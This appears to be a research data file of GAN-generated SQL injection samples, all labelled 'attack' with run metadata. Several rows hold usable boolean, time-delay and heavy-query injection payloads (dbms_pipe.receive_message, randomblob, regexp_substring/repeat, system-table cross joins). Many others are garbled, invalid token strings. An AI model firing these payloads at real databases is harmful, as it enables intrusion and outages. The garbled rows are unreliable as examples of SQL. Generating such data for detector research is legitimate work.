label,payload,family,payload_type,method,run_id,sample_index
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'm'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257
attack,"1%'+  (  select 'aous use_itesykt_unsyt3,asesy,ys fgchar char  (  char  =  (  (  ||charchar  (  (  8459  500000000p  (  (  )  (  (  g'    (  ||char  (  =   from attt1,ept_m.t  (   from a, qwherey andend    =   =    r epexp_unt_teget(  (  (  +char  8571   )   where t3/p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258
attack,"1t'   char  (  49   = or or 1570  =  from texp_lll_engf where t  (  (  (  (   (  +char  )    (  (  (  (  ,ag'  =9575  (  (  ,  (  6503 6849  (  (  (  88  (  *  (  (  (  (   r 2961y",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259
attack,"1%'4906ucs s where 6093 and where orkp_,rahtakyssysiom.un.s u,'  )   and    (    (   '.telsegu  (  =  1541(  (  +char  )  0  (  char  ""  )   or   (  ""or 8446744073709551610  (  ||char  =    ) al_omaaebLe,zeft  (  (  )    (  =     )    = or or char  (  ,_m,pgas llle",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260
attack,1%'   )     =    =   a.s,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261
attack,"1b'e)    (  =  (  (  (  char  ,0x717a767a71=  +105 char  (  ,char  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '    (  1087 or    and    (    (  or or 3580when    )    les as taljupes'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'sy t--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262
attack,"1'   (  =    ,  106  (  500000000  (/f,pef,s yt3  =  uppex  *   =     (  (  where or   (  (    *  (  6849 t(  (  (  =  (  (  (   (  ) 1,a2832    (  (  (  +char  100  (  +char      (  lug'    (  =    (  select or )         (  (  (  (  +char  (   =     ,s and   end t  =    (   )      (    ,up  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263
attack,"1'   113  (  else,_ibj        usafffsstres ib$,$fgchar  rtaexp_t  6503 x_u,m.ct_hbpdg  (  2649     char  (  (  (--""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""2774 qor 1i'      ,p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264
attack,1e0 66711 selectdounncdbub(  (  ||char  )  (2) and   (  3484)/4906)   bcharend  (  (  )   fromin aining  )    (  (   (  (  *  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265
attack,"1   %'  (    2774 ( =  (  =    =  =  Hjt1inbl_ull_,r,dful t3lepetchar  (  (  4018 char  (  b/  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266
attack,"--7731""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""   then char  ('   = #xpypys t  (    (  (  (  ,4018 te2180(  )     3862 ex  +char  (  (  char  (  3880   (    (  119  (  ,    (  )edo   agt  118  (  (  ,85  =  2724ehdoedohtll_ustas charr    aitass whereexpt  =    (  (  (  ||char  +  ||char  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267
attack,"  113char  (  )   (  =   3880 4018  u   (     (  h500000000  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '      --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268
attack,"l1'+  (  select 'abrer  =    typexp  ,dt  (  (  *  t,)    ) char  (  (  (  (  1441  +char  (  and al_k char  =   t  (  (  (  (   (  +8446744073709551610--""  =  ""  (char  =  r2pet1,don",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269
attack,"_u t8459e(  (    (    (  =  ||a(epdb$f,sas asunt  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270
attack,"1'+  (  select 's aonas uk2961yyj where or 4   fromsns t  (  (  (  (  (  (  =    )  2724  ,asdtl_ul_un.s des ruptt2eaobr    c",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271
attack,"-R8571t""  ruslndsatars aguuom,ant s t3/un.p,ret  ,$int_,so rs t1ds    s inbl_crin.s fromunwtwsaftcharchar  ,500000000  (  (  ||char  (  select ain#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272
attack,"1' in boolean mode  )   or 6979  =  like  (  'cete4799  (  end  (  (  convert  2 char  7522    (  (  113  =  =    113  =  =  ||( or 3580 where 79ag  (  (  ,  2180,2180 and  --lep_ ima.s t5  )    refg'  =  'synppalftt2,l_uhas and 3038  (  =  119   (  (  (  )    les   b  (  (  (  100  ||char    1541  (  e2 or  or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274
attack,"-'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  ( t9575(  (   (   (  (  =  (    )   upeg,rdd.stuntrtaealeom.tasus,domasin..rghty   (  ||res t(    (  )    (  char  )  (  4018iuntep  (  (  (  (  (  )     *exsunte_t  =    (  (  select ' and and a(    cn t(  (  (  (  (  (  (  500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275
attack,"1""   rddmusdom.s t    =ptet_dst twhen 5485 4018 3393 _sb= cinnp_ghet  =xpalgus  u   (    (  (  fsyfunwert2t  from rjregint1t3,rer6388   3580  (  (  8403  =    (  =    (  (  =    =    (  (  )    (   from a.bll_ules t  (  (  (  select) t0x78    (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'bfgefres or ' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ' (  (ep  =  (  (  (  (  (  (  (  (  (  (  (   (  101  (  (  (  )  (  6503 where  (  (  when   s or apll$',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ' asbk,antfg'st1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277
attack,"1%'  =  '7770' and where 1087  (  121  9354 _,dob eart_s amadtm.tef as asgl.s t1as es adommms.uainsy'   )    )    or 5903  =    (  'bft_kd..tul,dombftm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278
attack,"1""aom..gu  ||char  (  105 ardt4 4799      =  ||char  117  (  (  69  (  )    (  *   (  ) 8446744073709551610u  ,    (  119   (us 8446744073709551610 c6503 andpy,s >p ins ' where char  (  4799      (  )     8288L ,  (  48$tryh_unt_s aol,s du     c   a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279
attack,"-likey' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'h'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280
attack,"(  (  )   b  (  (  (  $or  ,lumts anmcdos don.almds and or    ||char  1087ref(  (  4165122  )    if(  =  6503 a,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281
attack,"1%'   =    (   /*gu  )    n*exl_,atdin.s as  tor 3038  (  ort= 'unusual'    (  (  106  ,null  ) 2c--pablgt2rypl_us t1st   (  (  (  101  (  (  (  =    =  (  (  ,rg_tss--es at_t_uoulllu.as sy t3e,aos t3unrdebomaipsefs t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283
attack,"-44621""   where like or and at(  (  (  8459  (  (  (  (  101  113  (  (  (  * char  1048repes uns   (  =    (  select and where(  case   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""db' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ',ybl_kleg=   ,s aing  ,,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285
attack,"3' or a,p_,.,nullpl_un.' like 's as as inypdononk.   ,dsu4906ibnb(  (  (  )   &    (  char  (  (  *    (  113  (echar  (  =  (  (  (  (  1541preptys and 4799 and    (  (  =   (    (  (  (  0x7171706a7148counb$ffg_intefgeg%    ,dgm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286
attack,"1"" or a   6503 andupechar  (  =   (2774 8315  (  (  (  (  =  =    (  (  ("" like "",  (  (  (  =  = t (  y,*s 2724    (    (  or   7522 from    concat  100_2774 t      (  1441  113  (  3484",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287
attack,"' char  77  r7    (  ,(  (  (  106  )     (  (  (  )    f  (  ,st_ut  (  (  (  (  (  )  (  (  char  (  ( t     (     (  from   4018 3862 like  leshas ateles rugeg'    cedondonules jxe18899  l_udoms and   where   )   6093  ,0x717a767a71se,doml_   rimehsiorus ans",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288
attack,"2' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289
attack,"1%""   113  +char  )    =  =   mexpe,x,db$apantalefg_ubm500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290
attack,"1'||  (  select 'sydoubn where c_,omal_us tasib$t1ugt_ul_gueeppet  char  +char    (  (   (  ||char char  (  *    (  *   (  (  (  (  (   (  r  )unftas a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291
attack,"1""   117  121   +char  88  (  (  (  (  or ,      ) 2649 and    2774  (   5 /*65  (    =  121   ( or   6849 when  (   )    (  (    (  =  (   (  =    (  * orfrom 3580  1ubftaulns asuft'mardom0x78",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292
attack,"1'+  (  select 'j""  =  "",ab$conaa,fgumoserins abcbng_s t4 or 7417 a(  (  (  (  111    (  ""  =  ""n.p_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293
attack,"-%c2 where)    (  (  (  (  * 6093  ur or pl,lefb$siusis an.e,ecb$67     *in.ge",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294
attack,"char  ||char  cu$l_umns as t1d,apegil_ustas ablom.s t ypeg'innppes 8691(  106     (  (  122  2649  83  =    (  (  (  ,ddotr olpasugamtap likenim.ff,dtygu,at_immnsstt  = qu  )    (  (  *    (  (  (  (  (  (  (  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '    1,a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295
attack,"1"" 8446744073709551610n1668  117  =t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296
attack,"-'g'""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297
attack,"1""  117   )    )   from5   from and  (    ) char  =     lp1untt  (  ( char  7522  (  2    (  (  (  97      (   =  ||aiimncstunt  (  (     com5000000000  (  np  ( or dpingt (  +char  +  (  1570  (  =  ,rt_u.tcollsunte3580      (  ||char  y  (  ,ihl,hdbpegescst tas ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298
attack,"-91337770where    /9643  from    a, t  =   (      3880    (  (  (  111  (char  select and (  )    (   +  (  (  7793s t  (u(  (  ,$,pednpp1_s where 3580 5485/xpqe3580  =  =    )    =  (  (  (  )     )    m  repexs when  from   mas +)    fuat_at  (  (  0x7171706a71(    =hand 8315    (  (  (  97    (  (  (  select ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299
attack,"1""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300
attack,"12027sys aumabll_us asin,s asttu,zht_us,ablg$t  (  =  (   (  (  =      ,  =""1,as t1't  3580  fgdt_us u.trup_s t tefupeftaadst  bleb$33524906bgtcultageas as t3(  * char  (  (  100  ,ass at_,s t_ ell",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302
attack,"_llugNmabueb$.ta6388 t1,lus ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'s as,lingm,asinsincr asebglouomap$fogibt3  2774 and    ||char  ||char  (  )  (  /*e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303
attack,-w1570 cosegunt  =  +char  (  (  (  select   from 2724 suls as ty,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304
attack,"""  8518  (  (  r   =   =   2961e||char  105  *int  =  +char  (  (  )    (    (  (  (  (  (  )  (  ||t  ,,(  (  (  when  (  --l1st=  (  up   (  =do%usys 2s,ain.sddlmnomastt adounft7522ys t1,doma7522t3ss aefguu.sast,ptafuningjte",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""h""  =  ""g  (  83  +  select    (  ,0x717a767a71lexu   or and    (  (  (  (  6671s e  (  )     char  (  48  (  casetchar  (  (  1541p_in.siumstaball_(    (  (  *)    (    =  (  ||char  (  cw',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cong",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306
attack,1'+  (  select 'thzgchar(  (  =  ldj'  =  'db,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307
attack,"1%' in boolean mode  )   or 6979  =  like  (  'texpbltl_usbs t(    )  (  =  1048(   from rdas g(  ||(  (  (  =  select cb$f,1%n _( as t2,s ry",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308
attack,"1%KC.bmsbs assrioubngl  (  122   ,5000000000  1541ddonst_unsinmm.b$udmdpd,.skn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '1"" 3455   upzt1g1emb$lt_un,1   .noleco= t3  *ht    )  (  (  = ) char  ,y  (  (  (        (ex  2774 char  = (  (  (  else 9643 2774  +charchar  (  or and t_mdomatad.abm.pss dom.ouna.lt  (  113  = or like   (     ,char  (  (  (  = te(  (  ,  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311
attack,"1'case whereyp_t(    (  (  +char  1541ppechar  (  (  ,_ble char  (  (  (  (  (  )  =     ) and claf.t.gefrs and whent)   )   else or _ or 7555pp  (  ||char  t  =    nfapall_up1s aseusyg' like '  )    select   (   when 6503   rint_u0x717a767a71,xloninl_t_ktailinft1   om",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312
attack,"1%'  =  '/*tchar  (  )    (  106  (  )  1048domabnsiglasus as ,sag'p'(  (  (  2724      (  (    (  (  (  (  (  )  2642  =   m,refin  p_)",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313
attack,"12724 r""  =  ""g'yrdbsrh_usys abt_u,astt3l_k t(  (  (  118  (  (  (  char  (  select t(  (  500000000select   )   =    (  (  7555     + ,  (  *   (  +char  (  (  )    (  8518pdbl_ymrdnt3m_k a akulllubgi$g asugtchar  =   (   (  =  (  (  )    us likep_ rim'unusual's",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314
attack,"1   ""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""d%' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ''  ||char  5389  =    =     67u2  ,s fromj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,"1%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'h3038,y  (  (  char  (  char  (  (  (    (   (  101  (  (  1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"1""   end where  (    (  ,as  , ,rep_fibn.ta' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'hfl_ups t2cin.bl_t  =   --efea char  +  (  ,0  49   ,a,j_sttfrom un.p  =    (    (  ll_in. at5  (  =    (  (  (  113  (  char  (  +s7522 ,7185  || ,(  (  (  (  (  +char  112  (   (  (  =   from or from int",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,-j7417,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,"1' where or(     8315  ,null  =  =  =  (    (  ,yp1s restapl_untdin",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,"1   )   from atzi,rednbyab$bstas t1, apl_lim.  lomysudonbft  char  ,/2)    (  (  )   and where 7555  || 2642  (    (  113   (  (  (char   from      (  (  ) ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '""   7522 rgusestat3      ||char  (  500000000  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322
attack,"1"" a,rtas where or like and where (  =    (  from abcblcabmes aty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323
attack,1%'   )   =  r afet_rtesy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324
attack,"1   ||char  (     (  (  =  l_k   )    )  as at and 'unusual'edo)    (  )    f= t_(  500000000/2    ((  =  from a,s ain.as as t2le*s1uns agab  (   rint_us efb$g  = 4799 cbnat2,upstas$fb$ft_uunststall,fil_  = char  8459   (  (  =    (  2724 a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '   concat",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327
attack,1n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328
attack,""" 7522 _=     ns charp  (  122--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329
attack,"1118""  then 2832%  * 9643   (  (  )   )    (  ,pel_uzt2sysht_intreryb_te$dou.ss asinsbll_ulng' from do)    )    =  (  =  = agec,as and x and 9660 and from 6671  char  (   (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330
attack,"' 8315  )    )    caseexp_m,.syt char  (  (  (  +d' char  select =   (  = 7555,xp88  (   = x  (    (  (  =  113  (  (  (  122 6503  (  2774 and   from    (  3862sus   sy' or 'zolef,s in.sutt4,as where concat  =  (  (  cb$,x,9up_u,l_t4un.s char  500000000  ,null csus dok    a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331
attack,"1%%ba.sum.fi' or 'a and 3580    (  (  _ubl1lhou,adng  )    (  select like and 2961  = 'unusual'  5  )    (  (,(  49  (  (  (  (  113  )    (  ) or 6849et  select or or ct(    113  (  (  =  1570  (  (  select   (  =     char    s char  (  =     )   ,0x78   =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332
attack,"""    (  (  (  (  (  (  (  (  =    (  (  69  (  )es ' 9198=  =    select der and(  (  ,/2    (  (  =  rysushs t1,7555bsbsabluusifns where 2 and apepr ap  = astjksysiblunsis all_innt_(ansdbffasias t2lerhcobl_s as,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333
